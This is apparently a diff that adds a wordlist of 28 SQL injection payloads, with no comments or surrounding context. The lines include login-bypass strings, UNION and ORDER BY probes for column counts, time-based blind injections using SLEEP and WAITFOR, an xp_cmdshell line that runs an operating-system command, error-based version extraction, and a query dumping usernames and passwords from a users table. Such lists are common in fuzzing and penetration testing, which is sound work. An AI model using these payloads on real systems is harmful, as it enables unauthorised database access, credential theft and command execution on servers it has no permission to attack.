@@ -1,0 +1,28 @@
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin'--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 5--
+1' ORDER BY 10--
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1; EXEC xp_cmdshell('whoami')--
+' AND 1=1--
+' AND 1=2--
+' OR ''='
+') OR ('1'='1
+')) OR (('1'='1
+'||'1'='1
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' UNION SELECT username,password FROM users--
